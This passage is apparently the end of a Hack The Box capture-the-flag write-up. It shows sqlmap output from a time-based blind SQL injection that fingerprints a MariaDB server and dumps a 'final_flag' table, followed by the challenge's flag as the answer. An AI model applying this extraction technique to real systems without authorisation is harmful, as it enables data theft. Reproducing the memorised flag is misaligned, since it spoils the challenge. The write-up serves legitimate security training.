do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:55:45] [INFO] fetching columns for table 'final_flag' in database 'production'
[18:55:45] [INFO] retrieved: 
[18:55:55] [INFO] adjusting time delay to 1 second due to good response times
2
[18:55:55] [INFO] retrieved: id
[18:56:01] [INFO] retrieved: content
[18:56:27] [INFO] fetching entries for table 'final_flag' in database 'production'
[18:56:27] [INFO] fetching number of entries for table 'final_flag' in database 'production'
[18:56:27] [INFO] retrieved: 1
[18:56:28] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)       
HTB{n07_50_h4rd_r16h7?!}
[18:57:57] [INFO] retrieved: 1
Database: production
Table: final_flag
[1 entry]
+----+--------------------------+
| id | content                  |
+----+--------------------------+
| 1  | HTB{n07_50_h4rd_r16h7?!} |
+----+--------------------------+
```

Answer: `HTB{n07_50_h4rd_r16h7?!}`